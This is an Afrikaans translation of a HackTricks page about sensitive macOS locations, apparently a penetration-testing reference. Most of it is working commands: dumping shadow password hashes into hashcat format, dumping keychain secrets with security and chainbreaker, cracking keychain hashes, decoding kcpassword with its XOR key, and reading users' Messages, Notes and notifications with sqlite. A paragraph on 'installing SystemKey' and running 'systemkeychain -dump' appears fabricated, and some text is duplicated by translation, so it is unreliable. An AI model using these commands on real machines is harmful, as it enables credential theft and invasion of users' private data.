# macOS Sensitiewe Plekke

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Wagwoorde

### Skadu-wagwoorde

Skadu-wagwoord word saam met die gebruiker se konfigurasie gestoor in plists wat geleë is in **`/var/db/dslocal/nodes/Default/users/`**.\
Die volgende eenreëler kan gebruik word om **alle inligting oor die gebruikers** (insluitend hashtrekke) te dump:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Skripte soos hierdie een**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) of [**hierdie een**](https://github.com/octomagon/davegrohl.git) kan gebruik word om die has te omskep na **hashcat-formaat**.

'n Alternatiewe een-regel wat die geloofsbriewe van alle nie-diensrekeninge in hashcat-formaat `-m 7100` (macOS PBKDF2-SHA512) sal dump:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Sleutelbos Dump

Let daarop dat wanneer jy die `security` binêre gebruik om die dekripteerde wagwoorde te **dump**, sal verskeie aanvrae die gebruiker vra om hierdie operasie toe te laat.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Gebaseer op hierdie kommentaar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) lyk dit asof hierdie gereedskap nie meer werk in Big Sur nie.
{% endhint %}

### Oorsig van Keychaindump

'n Gereedskap genaamd **keychaindump** is ontwikkel om wagwoorde uit macOS-sleutelbosse te onttrek, maar dit het beperkings op nuwer macOS-weergawes soos Big Sur, soos aangedui in 'n [bespreking](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Die gebruik van **keychaindump** vereis dat die aanvaller toegang verkry en voorregte verhoog na **root**. Die gereedskap maak gebruik van die feit dat die sleutelbos standaard oopgemaak word by gebruikersaanmelding vir gerief, wat toepassings in staat stel om dit te benader sonder om die gebruiker se wagwoord herhaaldelik te vereis. As 'n gebruiker egter kies om hul sleutelbos na elke gebruik te sluit, word **keychaindump** ondoeltreffend.

**Keychaindump** werk deur 'n spesifieke proses genaamd **securityd** te teiken, wat deur Apple beskryf word as 'n daemon vir magtiging en kriptografiese handelinge, wat noodsaaklik is vir die toegang tot die sleutelbos. Die onttrekkingsproses behels die identifisering van 'n **Meester Sleutel** wat afgelei word van die gebruiker se aanmeldingswagwoord. Hierdie sleutel is noodsaaklik vir die lees van die sleutelbos-lêer. Om die **Meester Sleutel** te vind, skandeer **keychaindump** die geheuehoop van **securityd** deur die `vmmap`-opdrag te gebruik, op soek na potensiële sleutels binne areas wat as `MALLOC_TINY` geïdentifiseer word. Die volgende opdrag word gebruik om hierdie geheueposisies te ondersoek:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nadat potensiële hoofsleutels geïdentifiseer is, deursoek **keychaindump** die houers vir 'n spesifieke patroon (`0x0000000000000018`) wat 'n kandidaat vir die hoofsleutel aandui. Verdere stappe, insluitend ontmaskering, is nodig om hierdie sleutel te gebruik, soos uiteengesit in die bronkode van **keychaindump**. Analiste wat op hierdie gebied fokus, moet daarop let dat die noodsaaklike data vir die dekriptering van die sleutelhouer binne die geheue van die **securityd**-proses gestoor word. 'n Voorbeeldopdrag om **keychaindump** uit te voer is:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kan gebruik word om die volgende tipes inligting uit 'n OSX-sleutelbos op 'n forensies korrekte manier te onttrek:

* Gehashde Sleutelbos wagwoord, geskik vir kraak met [hashcat](https://hashcat.net/hashcat/) of [John the Ripper](https://www.openwall.com/john/)
* Internetwagwoorde
* Generiese wagwoorde
* Privaat Sleutels
* Openbare Sleutels
* X509 Sertifikate
* Veilige Notas
* Appleshare Wagwoorde

Met die sleutelbos ontgrendel wagwoord, 'n meestersleutel verkry deur [volafox](https://github.com/n0fate/volafox) of [volatility](https://github.com/volatilityfoundation/volatility), of 'n ontgrendelingslêer soos SystemKey, sal Chainbreaker ook platte teks wagwoorde voorsien.

Sonder een van hierdie metodes om die Sleutelbos te ontgrendel, sal Chainbreaker alle ander beskikbare inligting vertoon.

#### **Dump sleutelbos sleutels**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump sleutelbos sleutels (met wagwoorde) met SystemKey**

Om sleutelbos sleutels (met wagwoorde) te dump met SystemKey, kan jy die volgende stappe volg:

1. Installeer SystemKey op die teiken Mac-stelsel.
2. Voer die volgende opdrag uit in 'n Terminal-venster om SystemKey te gebruik:

   ```
   sudo systemkeychain -dump
   ```

   Hierdie opdrag sal die sleutelbos sleutels, insluitend die wagwoorde, dump en dit sal in die Terminal-venster vertoon.

Dit is belangrik om te onthou dat hierdie aksie 'n hoë vlak van toegang tot die stelsel vereis en slegs uitgevoer moet word met die nodige toestemming en wettige regte.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump sleutelbos sleutels (met wagwoorde) deur die has te kraak**

```bash
security dump-keychain -d login.keychain > keychain_dump.txt
```

This command dumps the contents of the login keychain, including the passwords, into a file called `keychain_dump.txt`. 

Hierdie bevel stort die inhoud van die aanmelding sleutelbos, insluitend die wagwoorde, in 'n lêer genaamd `keychain_dump.txt`.
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Stort sleutelbos sleutels (met wagwoorde) met geheue storting**

[Volg hierdie stappe](..#geheue-storting-met-osxpmem) om 'n **geheue storting** uit te voer
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump sleutelbos sleutels (met wagwoorde) deur die gebruiker se wagwoord te gebruik**

As jy die gebruiker se wagwoord ken, kan jy dit gebruik om sleutelbose wat aan die gebruiker behoort, te **dump en ontsleutel**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Die **kcpassword** lêer is 'n lêer wat die **gebruiker se aanmeld wagwoord** bevat, maar slegs as die stelsel eienaar **outomatiese aanmelding** geaktiveer het. Gevolglik sal die gebruiker outomaties aangemeld word sonder om vir 'n wagwoord gevra te word (wat nie baie veilig is nie).

Die wagwoord word in die lêer **`/etc/kcpassword`** gestoor en word ge-xored met die sleutel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. As die gebruiker se wagwoord langer as die sleutel is, sal die sleutel hergebruik word.\
Dit maak die wagwoord redelik maklik om te herstel, byvoorbeeld deur skripte soos [**hierdie een**](https://gist.github.com/opshope/32f65875d45215c3677d) te gebruik.

## Interessante Inligting in Databasisse

### Boodskappe
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Kennisgewings

Jy kan die Kennisgewingsdata vind in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Die meeste van die interessante inligting sal in **blob** wees. Jy sal dus die inhoud moet **onttrek** en dit omskakel na **leesbaar** vir mense of **`strings`** gebruik. Om dit te benader, kan jy die volgende doen:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notas

Die gebruikers se **notas** kan gevind word in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
